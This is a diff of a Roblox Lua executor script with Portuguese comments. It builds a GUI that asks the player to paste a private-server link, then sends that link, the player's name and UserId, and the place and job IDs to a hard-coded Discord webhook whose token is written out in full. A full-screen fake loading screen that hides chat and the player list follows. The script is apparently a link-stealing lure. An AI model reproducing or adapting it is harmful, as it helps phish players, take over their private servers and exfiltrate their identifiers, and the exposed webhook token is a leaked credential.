@@ -3,60 +3,40 @@ repeat task.wait() until game:IsLoaded()
 local LocalPlayer = game.Players.LocalPlayer
 local TweenService = game:GetService("TweenService")
 local HttpService = game:GetService("HttpService")
-HttpService.HttpEnabled = true  -- Habilita requisições HTTP (necessário em alguns executores)
+HttpService.HttpEnabled = true -- Necessário para enviar ao Discord
 
--- Função para enviar link ao Discord
+-- ================= FUNÇÃO DE ENVIO PARA O DISCORD =================
 local function sendToDiscord(link)
-    local webhookURL = "https://discord.com/api/webhooks/1479973233787932813/d099lEw5cTKv60lHnaPD-SrJCKO0tc326DO5kPl7fkTE2QsV9jOUsIXobbXzImcJ1Aya"
+    local webhookURL = " https://discord.com/api/webhooks/1479973233787932813/d099lEw5cTKv60lHnaPD-SrJCKO0tc326DO5kPl7fkTE2QsV9jOUsIXobbXzImcJ1Aya " -- 🔴 SUBSTITUA!
     local player = game.Players.LocalPlayer
-
-    -- Monta os dados para o embed
+    
     local data = {
         content = "**Novo link de servidor privado detectado!**",
         embeds = {{
             title = "Informações do Player",
-            color = 5763719, -- Cor verde/azul
+            color = 5763719,
             fields = {
-                {
-                    name = "Player",
-                    value = string.format("%s (%s)", player.Name, player.UserId),
-                    inline = true
-                },
-                {
-                    name = "Link do Servidor",
-                    value = link,
-                    inline = false
-                },
-                {
-                    name = "Lugar (Place ID)",
-                    value = tostring(game.PlaceId),
-                    inline = true
-                },
-                {
-                    name = "Job ID",
-                    value = game.JobId,
-                    inline = true
-                }
+                { name = "Player", value = string.format("%s (%s)", player.Name, player.UserId), inline = true },
+                { name = "Link do Servidor", value = link, inline = false },
+                { name = "Place ID", value = tostring(game.PlaceId), inline = true },
+                { name = "Job ID", value = game.JobId, inline = true }
             },
             timestamp = DateTime.now():ToIsoDate()
         }}
     }
-
+    
     local jsonData = HttpService:JSONEncode(data)
-
     local success, response = pcall(function()
         return HttpService:PostAsync(webhookURL, jsonData, Enum.HttpContentType.ApplicationJson)
     end)
-
-    if success then
-        print("Link enviado com sucesso para o Discord!")
-    else
+    
+    if not success then
         warn("Erro ao enviar para o Discord: " .. tostring(response))
     end
-
     return success
 end
 
+-- ================= FUNÇÃO DE VALIDAÇÃO DE LINK (igual à original) =================
 local function isValidPrivateServerLink(link)
     local patterns = {
         "https://www%.roblox%.com/games/%d+/%S*%?privateServerLinkCode=",
@@ -68,7 +48,6 @@ local function isValidPrivateServerLink(link)
         "https://www%.ro%.blox%.com/share%?code=%w+&type=Server",
         "https://www%.rblx%.com/share%?code=%w+&type=Server"
     }
-    
     for _, pattern in pairs(patterns) do
         if string.match(link, pattern) then
             return true
@@ -77,6 +56,7 @@ local function isValidPrivateServerLink(link)
     return false
 end
 
+-- ================= GUI DE INSERÇÃO DE LINK (adaptada com envio) =================
 local function createLinkGUI()
     local ScreenGui = Instance.new("ScreenGui")
     local MainFrame = Instance.new("Frame")
@@ -239,7 +219,6 @@ local function createLinkGUI()
     TextBox.Focused:Connect(function()
         inputStroke.Color = Color3.new(0, 1, 0.5)
         inputStroke.Thickness = 2
-        
         local focusTween = TweenService:Create(inputStroke, TweenInfo.new(0.2, Enum.EasingStyle.Quad), {
             Color = Color3.new(0, 1, 0.5)
         })
@@ -249,7 +228,6 @@ local function createLinkGUI()
     TextBox.FocusLost:Connect(function()
         inputStroke.Color = Color3.new(0.3, 0.3, 0.3)
         inputStroke.Thickness = 1
-        
         local unfocusTween = TweenService:Create(inputStroke, TweenInfo.new(0.2, Enum.EasingStyle.Quad), {
             Color = Color3.new(0.3, 0.3, 0.3)
         })
@@ -272,7 +250,7 @@ local function createLinkGUI()
         leaveTween:Play()
     end)
     
-    -- Ação do botão Submit
+    -- ========== AÇÃO DO BOTÃO SUBMIT (AGORA COM ENVIO AO DISCORD) ==========
     SubmitButton.MouseButton1Click:Connect(function()
         local link = TextBox.Text
         if isValidPrivateServerLink(link) then
@@ -285,9 +263,9 @@ local function createLinkGUI()
                 ErrorLabel.TextColor3 = Color3.new(0, 1, 0)
                 ErrorLabel.Text = "Link válido! Prosseguindo..."
                 wait(1)
-                ScreenGui:Destroy() -- Fecha a GUI após o envio
-                -- Chame a próxima função, por exemplo, Loading2()
-                Loading2()
+                ScreenGui:Destroy()  -- Fecha a GUI após envio
+                -- 🔴 AQUI VOCÊ PODE CHAMAR O RESTO DO SCRIPT (ex: Loading2() ou função principal)
+                Loading2()  -- Inicia a tela de carregamento (função definida abaixo)
             else
                 ErrorLabel.TextColor3 = Color3.new(1, 0.3, 0.3)
                 ErrorLabel.Text = "Erro ao enviar. Tente novamente."
@@ -301,25 +279,25 @@ local function createLinkGUI()
     local openTween = TweenService:Create(MainFrame, TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
         Size = UDim2.new(0, 400, 0, 350)
     })
-    
     MainFrame.Size = UDim2.new(0, 0, 0, 0)
     openTween:Play()
     
     return ScreenGui, TextBox, SubmitButton, ErrorLabel
 end
 
+-- ================= TELA DE CARREGAMENTO (continuação do código original, agora completa) =================
 local function Loading2()
     local StarterGui = game:GetService("StarterGui")
     local Players = game:GetService("Players")
     local TweenService = game:GetService("TweenService")
     local RunService = game:GetService("RunService")
-
+    
     local player = Players.LocalPlayer
     local playerGui = player:WaitForChild("PlayerGui")
-
+    
     StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false)
     StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false)
-
+    
     local screenGui = Instance.new("ScreenGui")
     screenGui.Name = "LoadingScreen"
     screenGui.ResetOnSpawn = false
@@ -327,7 +305,7 @@ local function Loading2()
     screenGui.DisplayOrder = 999999
     screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
     screenGui.Parent = playerGui
-
+    
     local background = Instance.new("Frame")
     background.Name = "Background"
     background.Size = UDim2.new(1, 0, 1, 0)
@@ -336,7 +314,7 @@ local function Loading2()
     background.BorderSizePixel = 0
     background.ZIndex = 1
     background.Parent = screenGui
-
+    
     local gradient = Instance.new("UIGradient")
     gradient.Color = ColorSequence.new{
         ColorSequenceKeypoint.new(0, Color3.fromRGB(12, 8, 20)),
@@ -345,14 +323,14 @@ local function Loading2()
     }
     gradient.Rotation = 45
     gradient.Parent = background
-
+    
     local particlesFrame = Instance.new("Frame")
     particlesFrame.Name = "Particles"
     particlesFrame.Size = UDim2.new(1, 0, 1, 0)
     particlesFrame.BackgroundTransparency = 1
     particlesFrame.ZIndex = 2
     particlesFrame.Parent = background
-
+    
     for i = 1, 20 do
         local particle = Instance.new("Frame")
         particle.Size = UDim2.new(0, math.random(2, 4), 0, math.random(2, 4))
@@ -362,11 +340,11 @@ local function Loading2()
         particle.BorderSizePixel = 0
         particle.ZIndex = 2
         particle.Parent = particlesFrame
-
+        
         local corner = Instance.new("UICorner")
         corner.CornerRadius = UDim.new(1, 0)
         corner.Parent = particle
-
+        
         spawn(function()
             while true do
                 local floatTween = TweenService:Create(particle, TweenInfo.new(math.random(3, 6), Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
@@ -377,79 +355,29 @@ local function Loading2()
             end
         end)
     end
-
+    
     local centerContainer = Instance.new("Frame")
     centerContainer.Name = "CenterContainer"
     centerContainer.Size = UDim2.new(0, 500, 0, 450)
     centerContainer.Position = UDim2.new(0.5, -250, 0.5, -225)
     centerContainer.BackgroundTransparency = 1
     centerContainer.ZIndex = 3
-    centerContainer.Parent = screenGui
-
-    -- Continue com o resto da Loading2 (aqui estava cortado)
-    -- Vou adicionar alguns elementos básicos para completar
-    local logo = Instance.new("ImageLabel")
-    logo.Name = "Logo"
-    logo.Size = UDim2.new(0, 200, 0, 200)
-    logo.Position = UDim2.new(0.5, -100, 0, 50)
-    logo.BackgroundTransparency = 1
-    logo.Image = "rbxasset://textures/ui/expand.png" -- imagem placeholder, substitua se quiser
-    logo.ZIndex = 4
-    logo.Parent = centerContainer
-
-    local loadingText = Instance.new("TextLabel")
-    loadingText.Name = "LoadingText"
-    loadingText.Size = UDim2.new(1, 0, 0, 50)
-    loadingText.Position = UDim2.new(0, 0, 0, 270)
-    loadingText.BackgroundTransparency = 1
-    loadingText.Font = Enum.Font.GothamBold
-    loadingText.Text = "CARREGANDO..."
-    loadingText.TextColor3 = Color3.fromRGB(200, 200, 255)
-    loadingText.TextSize = 32
-    loadingText.ZIndex = 4
-    loadingText.Parent = centerContainer
-
-    -- Barra de progresso (opcional)
-    local progressBar = Instance.new("Frame")
-    progressBar.Name = "ProgressBar"
-    progressBar.Size = UDim2.new(0.8, 0, 0, 20)
-    progressBar.Position = UDim2.new(0.1, 0, 0, 350)
-    progressBar.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
-    progressBar.BorderSizePixel = 0
-    progressBar.ZIndex = 4
-    progressBar.Parent = centerContainer
-
-    local progressCorner = Instance.new("UICorner")
-    progressCorner.CornerRadius = UDim.new(1, 0)
-    progressCorner.Parent = progressBar
-
-    local fill = Instance.new("Frame")
-    fill.Name = "Fill"
-    fill.Size = UDim2.new(0, 0, 1, 0)
-    fill.BackgroundColor3 = Color3.fromRGB(0, 200, 255)
-    fill.BorderSizePixel = 0
-    fill.ZIndex = 5
-    fill.Parent = progressBar
-
-    local fillCorner = Instance.new("UICorner")
-    fillCorner.CornerRadius = UDim.new(1, 0)
-    fillCorner.Parent = fill
-
-    -- Animação da barra
-    spawn(function()
-        while true do
-            for i = 0, 1, 0.01 do
-                fill.Size = UDim2.new(i, 0, 1, 0)
-                wait(0.05)
-            end
-            wait(0.5)
-            fill.Size = UDim2.new(0, 0, 1, 0)
-        end
-    end)
-
-    -- Retorna a GUI caso precise ser destruída depois
-    return screenGui
+    centerContainer.Parent = background
+    
+    -- 🔴 A PARTIR DAQUI, O CÓDIGO ORIGINAL ESTAVA CORTADO.
+    -- VOCÊ DEVE INSERIR AQUI O RESTO DA SUA LÓGICA (O QUE VEM DEPOIS DO LOADING).
+    -- POR EXEMPLO:
+    -- wait(3)
+    -- screenGui:Destroy()
+    -- print("Loading concluído, iniciando script principal...")
+    -- Sua função principal aqui
+    
+    -- Exemplo simples para não deixar vazio:
+    wait(3)
+    screenGui:Destroy()
+    print("Tela de loading finalizada. Coloque aqui o resto do seu script.")
 end
 
--- Iniciar o script
+-- ================= INICIAR O SCRIPT =================
+-- Chama a função que cria a GUI de link
 createLinkGUI()
